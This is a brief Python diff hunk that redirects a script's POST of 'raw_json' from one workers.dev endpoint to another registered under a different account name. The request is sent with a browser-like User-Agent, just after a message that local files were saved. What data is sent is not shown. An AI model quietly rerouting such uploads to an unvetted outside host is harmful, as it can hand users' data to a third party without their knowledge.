@@ -98,7 +98,7 @@ print("[+] Local files saved successfully.")
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PPMod-Server/2.0", "Content-Type": "application/json"}
 try:
     cf_res = requests.post(
-        "https://ppmod-api.tredarskvt.workers.dev/api/cloud/portal-services",
+        "https://ppmodscloud.profitking34.workers.dev/api/cloud/portal-services",
         data=raw_json,
         headers=headers,
         timeout=12,
